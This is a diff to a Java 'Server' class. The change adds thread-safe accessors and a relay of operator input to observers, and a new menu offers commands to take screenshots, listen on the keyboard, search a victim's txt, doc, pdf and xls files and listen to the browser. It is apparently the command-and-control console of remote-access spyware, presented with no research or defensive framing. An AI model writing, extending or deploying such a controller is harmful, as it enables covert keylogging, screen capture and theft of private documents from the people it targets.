@@ -10,12 +10,12 @@ public class Server extends Observable
     private boolean running;
     private int port;
 
-    public boolean isRunning()
+    public synchronized boolean isRunning()
     {
         return running;
     }
 
-    public void setRunning(boolean running)
+    public synchronized void setRunning(boolean running)
     {
         this.running = running;
     }
@@ -32,30 +32,39 @@ public class Server extends Observable
 
     public void startServer()
     {
-        while(running)
+        while(isRunning())
         {
-            try{
+            try
+            {
                 String message;
                 do {
+                    printMenu();
+
                     InputStreamReader inputStreamReader = new InputStreamReader(System.in);
                     BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
                     message = bufferedReader.readLine();
 
                     setChanged();
-                    notifyObservers(message);
 
-                    if (message.equals("quit"))
+                    if (message.equals("quit")){
                         System.out.println("closing connection");
+                        notifyObservers("0");
+                    }
+                    else
+                    {
+                        notifyObservers(message);
+                    }
 
                 } while(!message.equals("quit"));
             }
             catch(IOException ioException) {
                 ioException.printStackTrace();
             } finally {
-                running = false;
+                setRunning(false);
 
+                // shutdown gracefully
                 try {
-                    Thread.sleep(4000);
+                    Thread.sleep(10000);
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
@@ -63,7 +72,23 @@ public class Server extends Observable
         }
     }
 
-    public static void main(String args[]) {
+    private void printMenu()
+    {
+        StringBuilder menu = new StringBuilder();
+        menu.append("\nReady to send new commands\n");
+        menu.append("select commands sepateing them by ';'\n");
+        menu.append("i.e. x;y  \n");
+        menu.append("\t0. Close Connection\n");
+        menu.append("\t1. Print Screen\n");
+        menu.append("\t2. Listen On Keyboard\n");
+        menu.append("\t3. Search For Documents (txt,doc,pdf,xls)\n");
+        menu.append("\t4. Listen To Browser");
+
+        System.out.println(menu);
+    }
+
+    public static void main(String args[])
+    {
         Server server = new Server();
         server.setPort(args[0]);
 
